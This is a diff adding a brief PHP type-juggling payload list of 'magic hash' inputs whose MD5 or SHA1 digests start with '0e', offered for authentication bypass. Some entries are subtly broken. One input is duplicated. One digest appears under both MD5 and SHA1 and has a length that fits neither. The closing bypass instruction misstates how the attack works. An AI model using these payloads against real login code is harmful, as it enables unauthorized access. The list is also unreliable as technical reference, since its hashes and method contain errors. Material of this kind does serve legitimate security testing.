@@ -1,0 +1,15 @@
+# PHP Magic Hashes for Type Juggling
+# Strings whose MD5/SHA1 starts with 0e followed by digits (treated as 0 in loose comparison)
+
+## MD5
+240610708 -> 0e462097431906509019562988736854
+QNKCDZO   -> 0e830400451993494058024219903391
+240610708 -> 0e462097431906509019562988736854
+10932435112 -> 0e0776691500413317634705586502631
+
+## SHA1
+10932435112 -> 0e0776691500413317634705586502631
+
+## Common payloads for auth bypass
+# If check is: if (md5($input) == md5($expected))
+# Send any magic hash as both input and expected
